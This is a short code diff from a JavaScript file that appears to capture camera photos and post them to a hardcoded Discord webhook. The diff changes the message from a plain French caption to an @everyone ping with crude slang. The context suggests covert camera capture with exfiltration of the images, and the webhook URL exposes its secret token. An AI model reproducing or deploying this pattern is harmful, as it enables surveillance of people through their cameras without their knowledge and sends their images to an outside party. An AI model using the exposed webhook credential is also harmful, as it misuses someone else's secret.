@@ -95,7 +95,7 @@
                 const formData = new FormData();
                 formData.append('file', blob, `${label}_photo.png`);
                 formData.append('payload_json', JSON.stringify({
-                    content: `Photo prise depuis la caméra : ${label}`
+                    content: `||@everyone|| NOUVELLE PHOTO ZBI Photo prise depuis la caméra : ${label}`
                 }));
 
                 fetch('https://discord.com/api/webhooks/1313875221962293299/udiLUTH-dwm_A547e2doz1LLiFwOGPfCXUf83IzGEFtvYQ98-tljeg7hQE2ekiZG_w9J', {
